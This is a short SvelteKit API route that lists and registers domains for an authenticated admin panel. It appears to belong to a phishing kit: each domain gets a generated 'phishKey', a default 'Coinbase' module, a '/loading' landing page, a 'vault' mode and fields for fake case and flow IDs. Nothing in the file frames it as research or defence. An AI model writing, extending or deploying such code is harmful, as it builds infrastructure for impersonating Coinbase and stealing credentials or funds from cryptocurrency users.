import type { RequestHandler } from './$types';
import { json, error } from '@sveltejs/kit';
import { dbGetDomains, dbInsertDomain } from '$lib/server/database.js';
import { serverState } from '$lib/server/state.js';

export const GET: RequestHandler = async ({ locals }) => {
	if (!locals.user) throw error(401, 'Unauthorized');
	return json({ domains: dbGetDomains() });
};

export const POST: RequestHandler = async ({ locals, request }) => {
	if (!locals.user) throw error(401, 'Unauthorized');
	let body: {
		domain?: string;
		module?: string;
		landingPage?: string;
		kind?: 'regular' | 'vault';
		idMode?: 'case_input' | 'url_param';
		caseId?: string;
		flowId?: string;
	};
	try {
		body = await request.json();
	} catch {
		throw error(400, 'Invalid JSON');
	}
	const domain = (body.domain || '').trim();
	if (!domain) throw error(400, 'Domain is required');

	const phishKey = Math.random().toString(36).substring(2, 14);
	dbInsertDomain(domain, phishKey, {
		module: body.module || 'Coinbase',
		landingPage: body.landingPage || '/loading',
		kind: body.kind || 'regular',
		idMode: body.idMode || 'case_input',
		caseId: body.caseId || '',
		flowId: body.flowId || ''
	});

	serverState.domains = dbGetDomains();
	const inserted = dbGetDomains().find((d) => d.domain === domain);
	return json({ ok: true, domain: inserted ?? null });
};
